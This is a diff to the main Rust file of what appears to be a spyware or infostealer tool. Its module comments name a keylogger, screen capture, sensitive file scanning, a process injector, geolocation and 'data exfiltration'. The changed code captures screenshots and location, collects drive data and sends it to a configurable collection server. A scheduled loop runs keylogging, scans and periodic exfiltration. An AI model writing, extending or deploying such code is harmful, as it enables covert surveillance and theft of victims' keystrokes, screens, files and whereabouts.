@@ -5,29 +5,35 @@
 //! and sensitive file scanning. Data is collected locally and can be exfiltrated
 //! to a remote server with full metadata and analysis.
 
-/// Storage device enumeration and information gathering
-pub mod drives;
 /// USB and peripheral device monitoring
 pub mod device_monitor;
-/// Keyboard input monitoring and logging
-pub mod keylogger;
-/// Network communication for data exfiltration
-pub mod network;
-/// File system operations for data persistence
-pub mod writer;
-/// Logging utilities for application events
-pub mod log;
-/// Process monitoring and Python script execution module
-pub mod injector;
+/// Storage device enumeration and information gathering
+pub mod drives;
 /// File scanning and content analysis module
 pub mod file_scanner;
+/// Geo Location module
+pub mod geolocation;
+/// Process monitoring and Python script execution module
+pub mod injector;
+/// Keyboard input monitoring and logging
+pub mod keylogger;
+/// Logging utilities for application events
+pub mod log;
+/// Network communication for data exfiltration
+pub mod network;
 /// Screen capture module
 pub mod screen_capture;
+/// File system operations for data persistence
+pub mod writer;
+use crate::geolocation::Geolocator;
+use crate::log::Log;
 use serde::Serialize;
 use std::env;
-use crate::log::Log;
-
-
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+use tokio::select;
+use tokio::signal::ctrl_c;
+use tokio::time::{interval, Duration};
 
 #[derive(Serialize)]
 struct Payload<'a> {
@@ -53,28 +59,38 @@ async fn main() {
         Log::info(format!("  - {:?}", drive));
     }
     // 2.1. Capture and save a screenshot
-    match screen_capture::ScreenCapture::capture_and_save("logs/screenshots") {
-        Ok(path) => Log::info(format!("Screenshot saved to {}", path)),
-        Err(e) => Log::error(format!("Failed to capture screenshot: {:?}", e)),
+    match screen_capture::ScreenCapture::capture_and_save("logs/screenshots", None) {
+        Ok(paths) => {
+            for path in paths {
+                let _ = Log::info(format!("Screenshot saved to {}", path));
+            }
+        }
+        Err(e) => {
+            Log::error(format!("Failed to capture screenshot: {:?}", e));
+        }
     };
-    
+
     // 2.2. Get geolocation information
-    let geolocator = geolocation::Geolocator::default();
-    match geolocator.get_location_info().await {
+    let geolocator = Geolocator::default();
+    match geolocator.get_ip_location().await {
         Ok(location) => {
-            Log::info(format!("Geolocation information obtained"));
+            Log::info(format!("IP-based geolocation information obtained"));
             let location_str = geolocation::Geolocator::format_location(&location);
             Log::info(location_str);
-            let _ = writer::save_output(&location, "logs/geolocation.json", false)
-                .map_err(|e| Log::error(format!("Failed to save geolocation data: {}", e)));
-        },
-        Err(e) => Log::error(format!("Failed to get geolocation: {}", e)),
+            if let Err(e) = writer::save_output(&location, "logs/geolocation.json", false) {
+                Log::error(format!("Failed to save geolocation data: {}", e));
+            }
+        }
+        Err(e) => {
+            Log::error(format!("Failed to get geolocation: {}", e));
+        }
     };
     // 3. Persist locally.
     let _ = writer::save_output(&drives, "logs/drive_info.json", false)
-    .map_err(|e| Log::error(format!("Failed to save drive info: {}", e))); 
+        .map_err(|e| Log::error(format!("Failed to save drive info: {}", e)));
     // 4. Exfiltrate data to server.
-    let server_url = env::var("COLLECT_ENDPOINT").unwrap_or_else(|_| "http://localhost:8080/collect".to_string());
+    let server_url = env::var("COLLECT_ENDPOINT")
+        .unwrap_or_else(|_| "http://localhost:8080/collect".to_string());
     let hostname = sysinfo::System::host_name().unwrap_or_else(|| "unknown_host".to_string());
     let payload = Payload {
         hostname,
@@ -111,16 +127,10 @@ struct ServiceConfig {
 
 /// Main service runner with scheduled tasks
 async fn run_service(config: ServiceConfig, server_url: String) {
-    use tokio::time::{interval, Duration};
-    use tokio::signal::ctrl_c;
-    use tokio::select;
-    use std::sync::atomic::{AtomicBool, Ordering};
-    use std::sync::Arc;
-
     // Set up the shutdown signal
     let shutdown = Arc::new(AtomicBool::new(false));
     let shutdown_clone = shutdown.clone();
-    
+
     // Spawn a task to handle Ctrl+C
     tokio::spawn(async move {
         if let Ok(_) = ctrl_c().await {
@@ -135,9 +145,11 @@ async fn run_service(config: ServiceConfig, server_url: String) {
     let mut keylogger_interval = interval(Duration::from_secs(config.keylogger_interval_secs));
     let mut device_scan_interval = interval(Duration::from_secs(config.device_scan_interval_secs));
     let mut drive_scan_interval = interval(Duration::from_secs(config.drive_scan_interval_secs));
-    let mut process_scan_interval = interval(Duration::from_secs(config.process_scan_interval_secs));
+    let mut process_scan_interval =
+        interval(Duration::from_secs(config.process_scan_interval_secs));
     let mut file_scan_interval = interval(Duration::from_secs(config.file_scan_interval_secs));
-    let mut data_exfiltration_interval = interval(Duration::from_secs(config.data_exfiltration_interval_secs));
+    let mut data_exfiltration_interval =
+        interval(Duration::from_secs(config.data_exfiltration_interval_secs));
 
     // Service main loop
     while !shutdown.load(Ordering::SeqCst) {
@@ -178,12 +190,12 @@ async fn run_service(config: ServiceConfig, server_url: String) {
                 Log::info(format!("Performing scheduled data exfiltration"));
                 let hostname = drives::sys_info().current_user;
                 let drives = drives::list_drives();
-                
+
                 let payload = Payload {
                     hostname,
                     drives: &drives,
                 };
-                
+
                 Log::info(format!("Sending data to {}...", server_url));
                 match network::send_to_server(&payload, &server_url).await {
                     Ok(_) => Log::info(format!("Data sent successfully.")),
